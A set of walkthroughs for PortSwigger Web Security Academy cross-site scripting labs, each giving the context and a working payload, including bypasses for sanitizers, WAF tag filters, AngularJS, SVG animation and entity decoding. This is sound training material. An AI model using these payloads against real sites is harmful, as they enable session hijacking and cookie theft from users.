# 📝 Cross-Site Scripting (XSS) Lab Walkthroughs

Step-by-step solutions and techniques for PortSwigger Web Security Academy XSS labs.

---

### Lab 1: DOM XSS in `document.write` Sink via `location.search`
* **Source**: `location.search` (`productId` / `storeId` parameter).
* **Sink**: `document.write()` outputting inside a `<select>` element.
* **Payload**: `product?productId=1&storeId="></select><img src=1 onerror=alert(1)>`

---

### Lab 2: DOM XSS in AngularJS Expression
* **Context**: Angular framework scanning DOM with HTML-encoded quotes & angle brackets.
* **Payload**: `{{$on.constructor('alert(1)')()}}`

---

### Lab 3: Reflected DOM XSS via `eval()` Sink
* **Source & Sink**: `window.location.search` processed by `eval('var searchResultsObj = ' + this.responseText)`.
* **Payload**: `\"-alert(1)}//`
* **Breakdown**: `\"` escapes JSON string; `-` maintains syntax; `alert(1)` executes; `}` repairs JSON block; `//` comments trailing JS code.

---

### Lab 4: Stored DOM XSS with Flawed HTML Sanitizer
* **Vulnerability**: `escapeHTML()` function replaces only the *first* `<` and `>`.
* **Payload**: `<><img src=1 onerror=alert(1)>`
* **Execution**: First `<>` is sanitized to `&lt;&gt;`, while the second `<img>` tag executes.

---

### Lab 5: Reflected XSS with WAF Tag Filtering (`onresize` Event Handler)
* **Context**: Common tags (`<script>`) blocked; `<body>` allowed.
* **Exploit Server Delivery**:
  ```html
  <iframe src="https://vulnerable-site.net/?search=<body onresize%3Dprint()>" onload="this.style.width='100px'"></iframe>
  ```

---

### Lab 6: Custom HTML Tag Injection (`<xss>`)
* **Context**: All standard HTML tags blocked; custom tags allowed.
* **Payload**: `<xss id=x tabindex=1 onfocus=alert(document.cookie)>#x`
* **Mechanism**: URL fragment `#x` forces automatic focus on custom element `x`, triggering `onfocus`.

---

### Expert Lab 1: Event Handlers & `href` Blocked (SVG `<animate>` Bypass)
* **Context**: Event handlers (`onerror`, `onclick`) and direct `href="javascript:..."` attributes blocked.
* **Payload**:
  ```html
  <svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x=20 y=20>Click</text></a></svg>
  ```

---

### Lab 7: SVG `animatetransform` Injection
* **Payload**: `<svg><animatetransform onbegin=alert(1)></animatetransform></svg>`

---

### Lab 8: Reflected XSS in Canonical Link Tag
* **Payload**: `' accesskey='x' onclick='alert(1)` (Activated via `Alt+X`).

---

### Lab 9: Script Tag Breakout in JS Context
* **Context**: Reflected inside JavaScript string variable `var searchTerms = 'INPUT';`.
* **Payload**: `</script><script>alert(1)</script>`

---

### Lab 10: Backslash Escape Breakout
* **Payload**: `\';alert(1)//`

---

### Lab 11: `&apos;` Entity Breakdown in `onclick` Handlers
* **Context**: HTML attribute context decodes `&apos;` entity into single quote `'` prior to JS execution.
* **Payload**: `http://foo?&apos;-alert(1)-&apos;`
